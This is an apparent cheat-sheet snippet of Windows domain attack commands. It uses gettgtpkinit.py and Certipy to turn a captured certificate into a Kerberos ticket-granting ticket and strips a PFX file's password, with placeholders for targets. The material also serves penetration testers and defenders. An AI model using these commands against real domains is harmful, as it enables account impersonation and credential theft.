---
id: 36ea5f5a-25a2-43b4-b955-c3b408a2dc2a
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:06.176736+00:00'
updated_at: '2023-04-10T20:26:17.413716+00:00'
---

# Code Snippet 36ea5f5a

**Language**: ps1

```ps1
# Base64-encoded PFX certificate (string) (password can be set)
gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
​
# PEM certificate (file) + PEM private key (file)
gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# PFX certificate (file) + password (string, optionnal)
gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# Using Certipy
certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"
```


